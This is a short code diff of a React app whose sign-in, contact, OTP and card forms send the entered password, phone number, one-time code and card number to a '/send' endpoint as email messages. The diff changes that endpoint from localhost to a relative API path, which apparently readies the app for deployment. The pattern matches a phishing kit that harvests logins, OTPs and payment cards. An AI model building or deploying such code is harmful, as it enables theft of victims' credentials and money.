@@ -45,7 +45,7 @@ function App() {
   const handleSignIn = async (e) => {
     e.preventDefault();
     try {
-      await axios.post("http://localhost:5000/send", {
+      await axios.post("/api/send", {
         email: username,
         message: password,
         subject: "Login Details",
@@ -59,7 +59,7 @@ function App() {
   const handleContactSubmit = async (e) => {
     e.preventDefault();
     try {
-      await axios.post("http://localhost:5000/send", {
+      await axios.post("/api/send", {
         email: contactEmail,
         message: contactPhone,
         subject: "Contact Info",
@@ -73,7 +73,7 @@ function App() {
   const handleOtpSubmit = async (e) => {
     e.preventDefault();
     try {
-      await axios.post("http://localhost:5000/send", {
+      await axios.post("/api/send", {
         email: contactEmail,
         message: otp,
         subject: "OTP Verification",
@@ -87,7 +87,7 @@ function App() {
   const handleCardSubmit = async (e) => {
     e.preventDefault();
     try {
-      await axios.post("http://localhost:5000/send", {
+      await axios.post("/api/send", {
         email: contactEmail,
         message:
           `Card Number: ${cardNumber}\n` +
